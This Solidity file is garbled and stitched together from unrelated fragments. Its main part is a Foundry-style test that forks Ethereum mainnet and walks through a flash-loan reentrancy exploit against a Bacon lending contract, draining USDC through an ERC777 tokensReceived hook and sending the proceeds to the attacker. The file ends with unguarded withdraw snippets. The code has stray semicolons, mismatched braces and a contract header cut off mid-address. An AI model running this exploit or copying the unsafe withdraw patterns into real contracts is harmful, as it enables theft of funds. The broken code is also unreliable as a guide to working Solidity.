
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity >=0.7.0 <0.9.0;

/*;
*/;

;
;
contract ContractTest is DSTest {
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  IUniswapV2Pair pair =;
    IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
  IBacon bacon = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);
  uint256 count = 0;
  constructor() {
    cheats.createSelectFork("mainnet", 14326931);
    ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
      .setInterfaceImplementer(address(this),;
        bytes32(0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b),;
        address(this))};
  function test() public {
    emit log_named_uint("Before exploit, USDC balance of attacker:",
      usdc.balanceOf(msg.sender));
    pair.swap(6360000000000, 0, address(this), new bytes(1));
    emit log_named_uint("After exploit, USDC balance of attacker:",
      usdc.balanceOf(msg.sender))};
  function uniswapV2Call(address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data) public {
    usdc.approve(address(bacon), 10000000000000000000);
    bacon.lend(2120000000000);
    bacon.redeem(bacon.balanceOf(address(this)));
    usdc.transfer(msg.sender, ((amount0 / 997) * 1000) + 10**usdc.decimals());
    usdc.transfer(tx.origin, usdc.balanceOf(address(this)));
    if (sender.balance > 0) {
      sender.transfer(0)};
  function tokensReceived(address operator,
    address from,
    address to,
    uint256 amount,
    bytes calldata data,
    bytes calldata operatorData) public {
    count += 1;
    if (count <= 2) {
      bacon.lend(2120000000000)};
/*;
*/;

;
;
contract ContractTest is DSTest {
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D6
function sendToNoFallback(address payable recipient) public {
    recipient.transfer(1 ether)}
function unguardedWithdraw() public {
    (bool sent, ) = msg.sender.call{value: 1 ether}("");
    require(sent)}